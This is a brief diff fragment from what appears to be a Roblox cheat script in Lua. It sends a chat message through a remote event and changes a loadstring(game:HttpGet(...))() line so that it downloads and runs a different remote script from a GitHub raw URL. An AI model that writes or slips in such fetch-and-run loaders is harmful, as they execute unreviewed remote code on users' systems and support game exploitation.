@@ -91,5 +91,5 @@ wait(5)
                 local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                 Event:FireServer(A_1, A_2)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JazzyScripts/jazzy/main/xeno"))()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
 end
